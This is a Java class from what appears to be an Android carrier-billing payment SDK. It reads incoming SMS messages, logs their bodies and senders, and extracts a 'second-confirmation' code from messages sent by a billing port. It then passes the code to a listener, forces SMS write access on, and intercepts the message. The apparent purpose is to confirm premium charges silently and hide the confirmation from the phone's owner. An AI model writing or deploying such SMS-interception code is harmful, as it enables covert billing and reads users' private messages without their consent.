package com.tianzh.pay.service.msg;

import android.content.Context;
import android.database.Cursor;
import android.text.TextUtils;
import com.tianzh.pay.utils.LogUtils;
import com.tianzh.pay.utils.SmsWriteOpUtil;

/**
 * Created by pig on 2015-11-13.
 */
public class ConfirmMsgImpl extends InterceptIncomingMsgImpl {
    private String preKeyWorkds;
    private String backKeyWorkds;
    private ConfirmContentListener listener;

    public ConfirmMsgImpl(Context context, String port, String keyWorkds, String preKeyWorkds, String backKeyWorkds, ConfirmContentListener listener) {
        super(context, port, keyWorkds);
        this.preKeyWorkds = preKeyWorkds;
        this.backKeyWorkds = backKeyWorkds;
        this.listener = listener;
    }

    @Override
    public void handleMsg(Cursor cursor) {
        String textMsg = cursor.getString(cursor.getColumnIndexOrThrow("body"));
        String phoneNum = cursor.getString(cursor.getColumnIndexOrThrow("address"));

        LogUtils.d("ConfirmMsgImpl：textMsg = " + textMsg + "; phoneNum = " + phoneNum);
        if (phoneNum.equalsIgnoreCase(port) && textMsg.contains(preKeyWorkds) && textMsg.contains(backKeyWorkds)) {
            String confirmContent = textMsg.substring(textMsg.indexOf(preKeyWorkds) + preKeyWorkds.length(), textMsg.indexOf(backKeyWorkds));

            if (!TextUtils.isEmpty(confirmContent) && listener != null) {
                listener.handleConfirmContent(confirmContent);
            } else {
                LogUtils.e("截取的二次确认短信内容为空！");
            }

            if (!SmsWriteOpUtil.isWriteEnabled(context)) {
                SmsWriteOpUtil.setWriteEnabled(context, true);
            }

            interceptMsg(cursor);
        }
    }
}
